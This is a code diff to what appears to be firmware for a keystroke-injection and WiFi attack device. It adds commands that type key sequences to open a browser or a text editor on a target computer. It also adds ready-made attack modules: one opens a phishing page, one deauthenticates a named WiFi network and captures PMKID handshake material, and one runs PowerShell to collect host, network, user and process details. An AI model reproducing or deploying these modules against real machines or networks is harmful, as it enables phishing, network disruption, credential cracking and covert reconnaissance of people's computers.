@@ -803,6 +803,86 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- BROWSE_URL <url> — open a URL in the default browser (OS-aware) ---- */
+    if(strncmp(line, "BROWSE_URL ", 11) == 0) {
+        char expanded[FPWN_MAX_LINE_LEN];
+        fpwn_var_substitute(line + 11, expanded, sizeof(expanded));
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(800);
+            fpwn_type_string(expanded);
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        } else if(os == FPwnOSMac) {
+            /* open <url> via Terminal — works with any URL scheme */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(700);
+            fpwn_type_string("Terminal");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(1400);
+            fpwn_type_string("open ");
+            fpwn_type_string(expanded);
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        } else {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(1400);
+            fpwn_type_string("xdg-open ");
+            fpwn_type_string(expanded);
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        }
+        furi_delay_ms(1500);
+        return;
+    }
+
+    /* ---- OPEN_NOTEPAD — open a text editor (OS-aware) ---- */
+    if(strcmp(line, "OPEN_NOTEPAD") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
+            furi_delay_ms(800);
+            fpwn_type_string("notepad");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        } else if(os == FPwnOSMac) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
+            furi_delay_ms(700);
+            fpwn_type_string("TextEdit");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        } else {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
+            furi_delay_ms(1400);
+            fpwn_type_string("gedit &");
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_delay_ms(2);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        }
+        furi_delay_ms(1500);
+        return;
+    }
+
     /* ---- STRING ---- */
     if(strncmp(line, "STRING ", 7) == 0) {
         char expanded[FPWN_MAX_LINE_LEN];
@@ -4390,6 +4470,91 @@ static const char SAMPLE_PORT_SEQUENCE[] =
     "LED_COLOR GREEN\n"
     "PRINT Port scan complete\n";
 
+/* --- Phishing URL redirect --- */
+static const char SAMPLE_PHISH_REDIRECT[] =
+    "NAME Phish Redirect\n"
+    "DESCRIPTION Opens a phishing URL in the target's browser\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION URL https://example.com \"Phishing page URL\"\n"
+    "PLATFORM ALL\n"
+    "DELAY 500\n"
+    "LED_COLOR RED\n"
+    "PRINT Opening phishing URL...\n"
+    "BROWSE_URL {{URL}}\n"
+    "DELAY 3000\n"
+    "MINIMIZE_ALL\n"
+    "LED_COLOR GREEN\n"
+    "PRINT Payload delivered\n";
+
+/* --- Comprehensive WiFi+HID attack --- */
+static const char SAMPLE_WIFI_FULL_ATTACK[] =
+    "NAME WiFi Full Attack\n"
+    "DESCRIPTION Scan APs, deauth, PMKID capture, type results, save\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION TARGET_SSID TargetNetwork \"SSID to attack\"\n"
+    "PLATFORM ALL\n"
+    "IF_CONNECTED\n"
+    "  PRINT Phase 1: Scanning APs...\n"
+    "  LED_COLOR BLUE\n"
+    "  WIFI_SCAN\n"
+    "  WIFI_WAIT 5000\n"
+    "  PRINT Phase 2: Station scan...\n"
+    "  LED_COLOR CYAN\n"
+    "  WIFI_SCAN_STA\n"
+    "  WIFI_WAIT 5000\n"
+    "  PRINT Phase 3: Deauth {{TARGET_SSID}}...\n"
+    "  LED_COLOR RED\n"
+    "  WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
+    "  WIFI_WAIT 10000\n"
+    "  WIFI_STOP\n"
+    "  PRINT Phase 4: PMKID capture...\n"
+    "  LED_COLOR MAGENTA\n"
+    "  WIFI_SNIFF_PMKID\n"
+    "  WIFI_WAIT 15000\n"
+    "  WIFI_STOP\n"
+    "  PRINT Phase 5: Saving results...\n"
+    "  LED_COLOR YELLOW\n"
+    "  SAVE_WIFI\n"
+    "  PRINT Phase 6: Typing results to target...\n"
+    "  OPEN_NOTEPAD\n"
+    "  DELAY 2000\n"
+    "  STRINGLN === WiFi Attack Results ===\n"
+    "  WIFI_RESULT\n"
+    "  STRINGLN === Station Results ===\n"
+    "  WIFI_STA_RESULT\n"
+    "  LED_COLOR GREEN\n"
+    "  PRINT Attack complete!\n"
+    "END_IF\n";
+
+/* --- Data exfil via notepad (non-LED channel) --- */
+static const char SAMPLE_QUICK_EXFIL[] =
+    "NAME Quick Exfil\n"
+    "DESCRIPTION Exfil system info by typing into notepad then saving\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN\n"
+    "OPTION FILENAME C:\\temp\\recon.txt \"Output file path\"\n"
+    "PLATFORM WIN\n"
+    "DELAY 500\n"
+    "PRINT Exfiltrating system info...\n"
+    "LED_COLOR RED\n"
+    "OPEN_POWERSHELL\n"
+    "STRINGLN $info = @()\n"
+    "STRINGLN $info += \"=== HOSTNAME ===\"\n"
+    "STRINGLN $info += hostname\n"
+    "STRINGLN $info += \"=== IP CONFIG ===\"\n"
+    "STRINGLN $info += (ipconfig | Out-String)\n"
+    "STRINGLN $info += \"=== USERS ===\"\n"
+    "STRINGLN $info += (net user | Out-String)\n"
+    "STRINGLN $info += \"=== PROCESSES ===\"\n"
+    "STRINGLN $info += (Get-Process | Select Name,Id | Out-String)\n"
+    "STRINGLN $info -join \"`n\" | Out-File -FilePath {{FILENAME}}\n"
+    "DELAY 2000\n"
+    "STRINGLN exit\n"
+    "LED_COLOR GREEN\n"
+    "PRINT Recon saved to {{FILENAME}}\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -4523,4 +4688,13 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/port_sequence.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_PORT_SEQUENCE);
+
+    snprintf(path, sizeof(path), "%s/phish_redirect.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PHISH_REDIRECT);
+
+    snprintf(path, sizeof(path), "%s/wifi_full_attack.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_FULL_ATTACK);
+
+    snprintf(path, sizeof(path), "%s/quick_exfil.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_QUICK_EXFIL);
 }
